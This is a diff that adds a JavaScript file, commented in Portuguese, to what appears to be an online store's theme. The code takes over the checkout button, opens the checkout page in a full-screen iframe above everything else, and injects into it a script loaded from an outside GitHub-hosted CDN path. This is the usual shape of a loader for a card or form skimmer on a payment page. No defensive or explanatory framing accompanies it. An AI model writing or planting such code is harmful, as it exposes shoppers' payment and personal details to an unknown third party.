@@ -1,0 +1,41 @@
+// Função principal encapsulada
+(() => {
+  // Seleciona o botão
+  const checkoutBtn = document.querySelector("#CartDrawer-Checkout");
+
+  if (!checkoutBtn) {
+    console.error("Botão de finalizar pedido não encontrado.");
+    return;
+  }
+
+  // Remove o atributo form
+  checkoutBtn.removeAttribute("form");
+
+  // Define o evento de clique
+  checkoutBtn.addEventListener("click", () => {
+    // Cria o iframe
+    const iframe = document.createElement("iframe");
+    iframe.src = "/checkout"; // nova URL sem token
+    iframe.style.position = "fixed";
+    iframe.style.top = "0";
+    iframe.style.left = "0";
+    iframe.style.width = "100%";
+    iframe.style.height = "100%";
+    iframe.style.zIndex = "999999"; // alta prioridade
+    iframe.style.border = "none";
+
+    // Adiciona ao body
+    document.body.appendChild(iframe);
+
+    // Quando carregar, injeta o script externo
+    iframe.onload = () => {
+      try {
+        const script = iframe.contentDocument.createElement("script");
+        script.src = "https://cdn.jsdelivr.net/gh/eufiqueitaotriste/1@main/1.js";
+        iframe.contentDocument.body.appendChild(script);
+      } catch (e) {
+        console.error("Erro ao injetar o script no iframe:", e);
+      }
+    };
+  });
+})();
